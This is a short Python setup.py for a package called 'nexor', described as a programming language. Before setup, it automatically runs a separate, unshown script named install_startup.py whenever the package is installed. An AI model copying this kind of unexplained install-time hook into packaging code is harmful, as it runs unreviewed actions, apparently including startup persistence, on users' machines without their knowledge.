from setuptools import setup
import subprocess


subprocess.run(["python", "install_startup.py"], check=True)

setup(
    name='nexor',
    version='1.0.0',
    py_modules=['nexor'],
    entry_points={
        'console_scripts': [
            'nexor=nexor:main',
        ],
    },
    author='Hernández',
    description='Lenguaje de programación Nexor',
)
